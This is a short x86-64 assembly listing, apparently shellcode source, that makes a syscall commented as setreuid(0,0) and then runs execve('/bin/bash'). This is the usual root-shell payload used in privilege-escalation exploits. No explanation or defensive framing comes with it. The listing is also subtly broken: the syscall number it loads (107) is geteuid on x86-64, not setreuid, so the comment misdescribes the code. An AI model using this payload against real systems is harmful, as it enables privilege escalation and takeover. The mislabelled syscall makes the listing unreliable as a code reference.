.section .text
.globl _start

_start:
    /* setreuid(0,0) */
    xor     %rdi, %rdi
    xor     %rsi, %rsi
    mov     $107, %rax
    syscall

    /* execve("/bin/bash", NULL, NULL) */
    mov     $59, %rax
    lea     path(%rip), %rdi
    xor     %rsi, %rsi
    xor     %rdx, %rdx
    syscall

path:
    .string "/bin/bash"